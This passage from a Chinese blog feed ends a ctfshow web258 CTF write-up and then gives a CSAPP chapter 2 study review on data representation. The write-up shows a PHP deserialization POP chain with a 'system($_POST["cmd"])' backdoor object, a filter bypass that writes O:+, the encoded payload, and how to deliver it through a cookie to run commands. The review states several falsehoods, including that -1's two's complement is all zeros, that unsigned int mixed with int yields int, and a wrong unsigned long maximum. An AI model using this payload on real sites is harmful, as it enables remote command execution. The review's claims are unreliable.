<code>C:数字</code> 的形式，并且无视大小写，那么我们需要绕过，通过在冒号后面加上一个 <code>+</code> 即可绕过，我们在反序列化对象时，可以加一个字符串替换，将 <code>O:</code> 替换为 <code>O:+</code>， <code>C:</code> 替换成 <code>C:+</code>，所以我们最终 <code>poc</code> 为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A22%3A%22system%28%24_POST%5B%22cmd%22%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>我们在 <code>cookie</code> 的 <code>user</code> 字段中传入 <code>poc</code>，然后 <code>post</code> 给一个 <code>cmd</code> 参数作为命令执行。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/1.png" alt="1"></p><p>发现 <code>flag.php</code>，我们 <code>cat /flag</code> 并且打开源代码发现 <code>flag</code>。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/2.png" alt="2"></p><p>这里主要还得注意 <code>url</code> 编码传入，因为 <code>cookie</code> 以 <code>;</code> 作为分割符号。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> unserialize </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP第二章复习</title>
      <link href="/2022/06/03/CSAPP_Datalab/"/>
      <url>/2022/06/03/CSAPP_Datalab/</url>
      
        <content type="html"><![CDATA[<p>之前 <code>CS:APP</code> 没有好好学，今天下定决心来重新看一遍，并把实验好好做一遍以巩固自身。</p><span id="more"></span><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h3><p>二进制：区别于我们平时计数使用的十进制，二进制使用的是逢二进一原则，而我们的十进制则是逢十进一，比如我们十进制的 <code>9+1</code> 中的 <code>9</code>，答案应该是十，但是十应该进一，因此得出了我们常规的答案 <code>10</code>。在二进制里面，每一位只要大于等于 <code>2</code> 则都要向高位进一。为了方便表示，还衍生出了二进制的子类，比如八进制，十六进制等，主要是二进制向这R</p><p>些进制转换较为容易，而计算机平时又都处理二进制数据，因此就出现了这些常见的进制计数。</p><h3 id="信息存储-1"><a href="#信息存储-1" class="headerlink" title="信息存储"></a>信息存储</h3><p>大多数计算机使用的都是8位（在计算机中，除特殊说明外，一位均指的是二进制的位）的块，或者叫字节，字节是作为计算机可寻址的最小单位。一般来说我们并不习惯于将一个字节写成八位二进制的数，而是会写成两位十六进制的数。十六进制与二进制之间的转换也会十分容易，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x99-&gt;0b10011001</span><br><span class="line">0x88-&gt;0b10001000</span><br></pre></td></tr></table></figure><p>我们可以发现我们并不用像十进制那样权值相加或者是除二取余那么麻烦，我们把一位十六进制视为四位二进制即可，这样我们在转换的时候就是直接每一位分别转了，可以看出十分的方便。</p><h4 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h4><p>每台计算机都有一个字长，字长为计算机 <code>CPU</code> 一次能处理的最大数据，也有一种说法是能表示的最大内存。其实意思是差不多的，比如我们都知道 <code>32</code> 位的计算机最多能装 <code>4GB</code> 的内存，再多它也是只能使用这么多的内存，那是因为 <code>CPU</code> 要访问内存的时候，也只能使用一个 <code>32</code> 位的数据来表示地址，32位的数能表示的数的个数也就是 <code>2^32</code> 这么多，而地址指示的单位是字节，所以最多就是 <code>2^32</code> 字节，那就是熟知的 <code>4GB</code> 了。</p><p><code>C</code> 语言中  <code>sizeof()</code> 会返回一个对象所占的字节数，我们对比输出下 <code>32</code> 位机子和 <code>64</code> 位机子的各个基本数据类型所占的字节数。我们不必找两个机子，只需要在 <code>64</code> 位的机子上分别编译 <code>32</code> 位和 <code>64</code> 位的程序即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;short:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;long:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char *:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;float:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;double:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>32 </code>位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/1.png" alt="1"></p><p><code>64</code> 位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/2.png" alt="2">    </p><p>我们总结出如下表格</p><table><thead><tr><th>C声明</th><th>32位字节数</th><th>64位字节数</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><p>其实有些时候， <code>long</code> 的字节数也会随机器字长有所变化的，只是好像某个版本区分了 <code>64</code> 位整数就叫 <code>long long</code> 而 <code>long</code> 地位与 <code>int</code> 一致了。但是除了这个问题，可以发现只有指针类型的数据会随着机器字长发生变化，这也如我们所说，机器字长决定了指针就多少位，决定了有多少个地址，能用多少内存，多出的内存机器就无法做区分了。</p><h3 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h3><p>对于多字节的数据类型我们必须确定两点：</p><ol><li>这个对象地址在哪里</li><li>这个对象中的字节按什么顺序排列</li></ol><p>比如一个 <code>int</code> 它有四个字节，那么我定义 <code>int a=0x12345678</code>。首先它一定是连续排列的，因此我们确定一个 <code>int</code> 的地址只需要确定它的最高字节的位置即可确定整个 <code>int</code> 的位置。假如 <code>int</code> 的地址是在 <code>0x100</code> 的，那么它应该怎么排列这些字节呢？</p><p>我们最初可能按照惯性，认为它是按照如下方式存储的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：12  34  56  78</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这个也很符合我们的书写规则，但是实时却恰恰相反，在现在大部分的机器中，它是反着存储的。也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：78  56  34  12</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这两种存储方式我们分别叫大端序和小端序。</p><ul><li><p>大端序：最高有效字节在低地址</p></li><li><p>小端序：最高有效字节在高地址</p></li></ul><p>在我们书写汇编语言的时候，要写一个值通常也是以小端序的方式书写的。</p><p>比如我给 <code>eax</code> 寄存器加上 <code>0x12345678</code> 你会发现它的字节码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x12345678,%eax </span><br><span class="line">b8 78 56 34 12</span><br></pre></td></tr></table></figure><p>我们通过定义以下的函数以十六进制来逐个显示内存中的字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>start</code> 参数为该对象的起始地址，<code>len</code> 参数为显示的字节数，可以任意定义变量调用这个函数来查看这个对象在内存中的排布，理解浮点数的时候这个函数非常有用。</p><p>来查看下面的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0x3039</span>;</span><br><span class="line">    show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">float</span> y=x;</span><br><span class="line">    show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现浮点数的输出在整数形态下为 <code>0x4640E400</code>。与整数的存储有着截然不同的结果，但是我们对这个结果的二进制适当移位就会发现它们有13个相匹配的位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0   0   0   0   3   0   3   9</span><br><span class="line">0000000000000000001000000111001</span><br><span class="line">            4   6   4   0   E   4   0   0</span><br><span class="line">         01000110010000001110010000000000</span><br></pre></td></tr></table></figure><p>我们也可以看到13个位刚好就是 <code>int</code> 形式下的低 <code>13</code> 位，这并不是巧合，大家可以试试看其它数，并且可以看看它最多能匹配多少位的整数，但是要注意结论需要有一般性，特殊的数字符合并不能得出什么结论，只能说是特性。</p><h3 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h3><p>字符串的定义就是一个以 <code>null</code> 字符结尾的字符数组，如果将字符串看成一个数据类型的话，那么它是以大端形式存储的，但是其实实际上应该说是数组是大端存储的。我们在书写的时候，一般下标 <code>0 </code>是最小的，但是我们习惯把它称为高位，高位在低地址便是大端序。比如 <code>char s[]=&quot;1234&quot;;</code> 那么 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=4,s[4]=NULL</code>。请注意末尾的空字节也会包括在字符串里面，但是我们算长度不会算上这个字节。在 <code>gcc</code> 编译器中，我们编译如下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会发出可能存在溢出的警告，因为在拷贝的时候会多携带一个 <code>0</code> 字节过来，这在后面堆利用中也是很常见的 <code>off by null</code> 的手段。</p><p>再比如我们用这样的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行我们也可以发现这个 <code>char</code> 数组占用了 <code>17</code> 个字节的空间。</p><h3 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h3><p>布尔代数是一个建立在二元集合集合 <code>G=&#123;0,1&#125;</code> 上的定义。</p><h4 id="非"><a href="#非" class="headerlink" title="非"></a>非</h4><blockquote><p>非0即为1，非非0即为0。</p></blockquote><h4 id="与"><a href="#与" class="headerlink" title="与"></a>与</h4><blockquote><p>全1为1，不全1为0</p></blockquote><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><blockquote><p>全0为0，不全0为1</p></blockquote><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><blockquote><p>相同为0，不同为1</p></blockquote><hr><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ol><li>非0为1，非1为0</li><li>1与1为1，1与0为0，0与1为0，0与0为0</li><li>1或1为1，1或0为1，0或1为1，0或0为0</li><li>1异或1为0，1异或0为1，0异或1为1，0异或0为0</li></ol><p>在C语言中也有一个类型是 <code>bool</code>，它们有特殊的运算符：</p><ul><li>与：&amp;&amp;</li><li>或：||</li><li>非：!</li></ul><p>不一样的是，在进行这些运算的时候，统统会把参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code></p><h3 id="C语言当中的位级运算"><a href="#C语言当中的位级运算" class="headerlink" title="C语言当中的位级运算"></a>C语言当中的位级运算</h3><h4 id="位逻辑运算"><a href="#位逻辑运算" class="headerlink" title="位逻辑运算"></a>位逻辑运算</h4><p>我们平时C语言的位运算会扩展到每一位，位之间独立地运算，我们可以把一个整数(int)视为32维的向量，每个维度为0或者1，对整数进行位逻辑运算相当于每一位分别做逻辑运算，每一位结果为新向量对应位的结果。在 <code>C</code> 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><p>我们可以在只拥有非和其它任意一个双目运算来实现所有的位逻辑运算。</p><p>比如我不用异或实现异或的功能，那么就是：</p><p>一个为 <code>1</code>，一个为 <code>0</code> 那么为或者一个为 <code>0</code>，一个为 <code>1</code> 的情况都是 <code>1</code>，其余都是 <code>0</code>。我们知道与的特性就是只有全 <code>1</code> 的时候为 <code>0</code>，那么如果我其中一个取非了，再与还是1的话就说明一个为 <code>1</code> 一个为 <code>0</code> 了，两边都非一下，最后把符合条件的位或一下就能得到异或的结果了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xor</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (~x&amp;y)|(x&amp;~y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那与和或，把非运用到位了它们两个也能运用自如自由转换。</p><p>比如我用与和非实现或，首先我对两个元素都非一下然后与起来，是不是就变成了：</p><p>全 <code>0</code> 为 <code>1</code>，其余为 <code>0</code> 了，这和或的全 <code>0</code> 为 <code>0</code>，其余为 <code>1</code> 差了什么？很显然结果反了，那么我就对结果再非一下，最后就变成了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">or</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或和非实现与运算同理。</p><h4 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h4><p>这里分逻辑移位和算数移位，其实差不多，只不过逻辑移位适用无符号整数，算数移位适用有符号整数。</p><p>分左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 来表示，假设整数一共 <code>w</code> 位，右移 <code>n</code> 位表示丢弃低 <code>n</code> 位，原来的高<code>w-n</code> 位变为低 <code>w-n</code> 位，高 <code>n</code> 位变为0。左移 <code>n</code> 位表示丢弃高 <code>n</code> 位，原来的低 <code>w-n</code> 位变为高 <code>w-n</code> 位，低 <code>n</code> 位变为0。</p><h5 id="逻辑移位"><a href="#逻辑移位" class="headerlink" title="逻辑移位"></a>逻辑移位</h5><p>左移右移就是字面意思</p><h5 id="算数移位"><a href="#算数移位" class="headerlink" title="算数移位"></a>算数移位</h5><p>正数与逻辑移位一样，负数则会在右移的时候高位添1.</p><hr><p>左移x相当于对该数乘 <code>2</code> 的 <code>x</code> 次方，右移相当于对该数除 <code>2</code> 的 <code>x</code> 次方取整。</p><p>当移位的位数大于等于该整数的最大位数，则会取模再移位。</p><h3 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h3><p>整数我们之前讲过了它的字节排布规律，但是对于负数计算机又将如何处理呢？</p><h4 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h4><p>我们先来看一张表格</p><table><thead><tr><th>C定义</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808</td><td>9223372036854775807</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615</td></tr></tbody></table><p>我们可以很清楚地看到，有符号数在正数和负数的范围并不严格对称，这是为什么我们接下来再看。</p><h4 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h4><p>无符号数的编码就是用一个固定长度的向量来表示，每个维度上的值取 <code>0</code> 或者 <code>1</code>，那么有</p><p><img src="/2022/06/03/CSAPP_Datalab/3.png" alt="3"></p><p>这个是我们最容易理解的。</p><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>有符号数因为需要表示负数，因此它规定：最高位的权值为负。</p><p>也就是说若最高位为1，而我们知道，在等比数列 <code>ai=2^i</code> 中，数列的前n项和永远比第 <code>n+1</code> 项小 <code>1</code>，根据等比数列前 <code>n</code> 项和的公式。因此若最高位为1，那么其它位不管是是怎样都不会使这个数变为一个正数。而前 <code>n-1</code> 项可以表示 <code>0~2^n-1</code> 的范围，所以负数的范围就是<code>-2^n+0~-2^n+2^n-1</code> 也就是我们熟知的 <code>-2^n~-1</code> 再加上正数表示的 <code>0~2^n-1</code> 连起来的范围就是 <code>-2^n~2^n-1</code> 啦。</p><h4 id="有符号与无符号数之间的转换"><a href="#有符号与无符号数之间的转换" class="headerlink" title="有符号与无符号数之间的转换"></a>有符号与无符号数之间的转换</h4><p>隐式转换按顺序遵从以下原则：</p><ol><li>浮点数参与运算就是浮点数，出现过double则结果一定为double</li><li>若都是整数参与运算则结果也是整数</li><li>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</li></ol><p>因此，如果</p><ul><li>运算中有 <code>unsigned short</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>float</code> 则结果为 <code>float</code>。</li></ul><p>也就不一一列举了。</p><p>有符号与无符号的位于区别就是最高位的权值正负问题，比较的时候任意一方出现无符号则另一方也会变成无符号比较，所以如果我们做以下运算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&lt;(<span class="keyword">unsigned</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>会发现它结果为0.</p><p>因为 <code>-1</code> 的补码全为 <code>0</code>，转为无符号之后会变成无符号整数的最大值。</p><h4 id="扩展一个数字的表示"><a href="#扩展一个数字的表示" class="headerlink" title="扩展一个数字的表示"></a>扩展一个数字的表示</h4><p>将一个位数较小的整数扩展为位数较大的整数非常简单，我们只需要在开头添加 <code>0</code> 即可，但是如果是负数，则需要开头添 <code>1</code>，我们运行以下代码试试看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">short</span> x=<span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">short</span> y=<span class="number">-0x1234</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line"><span class="keyword">int</span> x1=x;</span><br><span class="line"><span class="keyword">int</span> y1=y;</span><br><span class="line">show_bytes(&amp;x1,<span class="keyword">sizeof</span>(x1));</span><br><span class="line">show_bytes(&amp;y1,<span class="keyword">sizeof</span>(y1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行可以看到结果如我们所说。</p><p><img src="/2022/06/03/CSAPP_Datalab/4.png" alt="4"></p><h4 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h4><p>有扩展，自然有截断，当运算的结果可能超出类型所能表示的最大范围的时候，就会发生溢出。</p><p>在无符号数或者正数当中，截断为 <code>w</code> 位的整数就相当于取模 <code>2^w</code> 